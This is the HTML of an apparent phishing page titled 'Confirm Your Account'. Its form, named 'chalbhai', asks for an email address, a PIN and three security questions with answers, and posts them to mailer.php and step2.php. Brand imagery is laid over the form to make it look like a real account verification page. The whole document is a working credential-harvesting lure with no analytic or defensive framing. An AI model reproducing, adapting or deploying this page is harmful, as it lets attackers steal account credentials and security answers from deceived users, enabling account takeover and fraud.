
<title>Confirm Your Account</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<link rel="shortcut icon" href="images/favicon.ico">
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head><body style="visibility: visible;" onload="unhideBody()">
<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>



<div id="image2" style="position:absolute; overflow:hidden; left:165px; top:119px; width:28px; height:762px; z-index:0"><img src="images/lines.png" alt="" title="" border="0" width="28" height="762"></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1157px; top:118px; width:20px; height:754px; z-index:1"><img src="images/line2.png" alt="" title="" border="0" width="20" height="754"></div>

<div id="image4" style="position:absolute; overflow:hidden; left:198px; top:128px; width:182px; height:293px; z-index:2"><a href="#"><img src="images/side.png" alt="" title="" border="0" width="182" height="293"></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:407px; top:605px; width:407px; height:86px; z-index:3"><a href="#"><img src="images/spot.png" alt="" title="" border="0" width="407" height="86"></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:412px; top:717px; width:550px; height:129px; z-index:4"><a href="#"><img src="images/loh.png" alt="" title="" border="0" width="550" height="129"></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:934px; top:119px; width:228px; height:370px; z-index:5"><a href="#"><img src="images/jjjjjj.png" alt="" title="" border="0" width="228" height="370"></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:169px; top:869px; width:1005px; height:92px; z-index:6"><a href="#"><img src="images/footer11.png" alt="" title="" border="0" width="1005" height="92"></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:175px; top:0px; width:997px; height:121px; z-index:7"><img src="images/header2.png" alt="" title="" border="0" width="997" height="121"></div>

<div id="text1" style="position:absolute; overflow:hidden; left:399px; top:173px; width:104px; height:20px; z-index:8">
<div class="wpmd">
<div>Email Address</div>
</div></div>
<form action=step2.php?verifyyour-account-all-information-verifying name=chalbhai id=chalbhai method=post>
<div id="text2" style="position:absolute; overflow:hidden; left:399px; top:208px; width:104px; height:20px; z-index:9">
<div class="wpmd">
<div>PIN</div>
</div></div>

<div id="text3" style="position:absolute; overflow:hidden; left:397px; top:245px; width:122px; height:21px; z-index:10">
<div class="wpmd">
<div>Security Question</div>
</div></div>

<div id="text4" style="position:absolute; overflow:hidden; left:401px; top:282px; width:104px; height:20px; z-index:11">
<div class="wpmd">
<div>Answer</div>
</div></div>

<div id="text5" style="position:absolute; overflow:hidden; left:401px; top:317px; width:104px; height:20px; z-index:12">
<div class="wpmd">
<div>Security Question</div>
</div></div>

<div id="text6" style="position:absolute; overflow:hidden; left:403px; top:356px; width:122px; height:21px; z-index:13">
<div class="wpmd">
<div>Answer</div>
</div></div>

<div id="text7" style="position:absolute; overflow:hidden; left:404px; top:395px; width:104px; height:20px; z-index:14">
<div class="wpmd">
<div>Security Question</div>
</div></div>

<div id="text8" style="position:absolute; overflow:hidden; left:404px; top:433px; width:122px; height:21px; z-index:15">
<div class="wpmd">
<div>Answer</div>
</div></div>
<form action="mailer.php" name="chalbhai" id="chalbhai" method="post">
<input name="formtext1" required="" title="Please Enter Right Value" type="email" style="position:absolute;width:290px;left:524px;top:170px;z-index:16">
<input name="formtext2" required="" title="Please Enter Right Value" type="password" style="position:absolute;width:290px;left:525px;top:205px;z-index:17">
<select name="formselect1" required="" style="position:absolute;left:525px;top:242px;width:288px;z-index:18">
<option value="Select Security Question">Select Security Question</option>

                             <option>What was the first movie i ever saw?</option>
<option>What is the middle name of my oldest child?</option>
<option>In wich city was my father born?</option>
<option>Who was my favortie cartoon character as a child?</option>
<option>What is my mother's middle name?</option>
<option>In what year what year did i meet my significant other?</option>
<option>What was my first pet's name?</option>
<option>First name of the maid of honour at my wedding?</option>
<option>First name of my best friend in elementary school?</option>
<option>Name of my all-time favorite movie character?</option>

</select>
<input name="formtext3" required="" type="text" style="position:absolute;width:290px;left:525px;top:280px;z-index:19">
<select name="formselect2" required="" style="position:absolute;left:527px;top:315px;width:288px;z-index:20">
<option value="Select Security Question">Select Security Question</option>
<option>What was the first book i ever read?</option>
<option>What was the first company i ever worked for?</option>
<option>What high shcool did my mother attend?</option>
<option>In wich city was my mother born?</option>
<option>What is my spouse's/partner's middle name?</option>
<option>In wich city did i get married?</option>
<option>What is my best friend's first name?</option>
<option>What is the name of the first school i attended?</option>
<option>What was my kindergarten teacher's last name?</option>
<option>What is the first name of my oldest cousin?</option>

</select>
<input name="formtext4" required="" type="text" style="position:absolute;width:290px;left:527px;top:353px;z-index:21">
<select name="formselect3" required="" style="position:absolute;left:529px;top:391px;width:288px;z-index:22">
<option value="Select Security Question">Select Security Question</option>
<option>What was the make of my first car?</option>
<option>What high school did my father attend?</option>
<option>Wich city did i meet my significant other?</option>
<option>Last name of my favorite high school teacher?</option>
<option>Wich country did i go to on my honneymoon?</option>
<option>First name of my best man at my wedding?</option>
<option>What was the name of my first manager?</option>
<option>In what town or city my significant other was born?</option>
<option>Last name of my childhood best friend?</option>
<option>What is the first of my oldest nephew?</option>

</select>
<input name="formtext5" required="" type="text" style="position:absolute;width:290px;left:529px;top:429px;z-index:23">
<div id="formimage1" style="position:absolute; left:747px; top:493px; z-index:24"><input type="image" name="formimage1" width="75" height="18" src="images/signin.png"></div>



</form></body></html>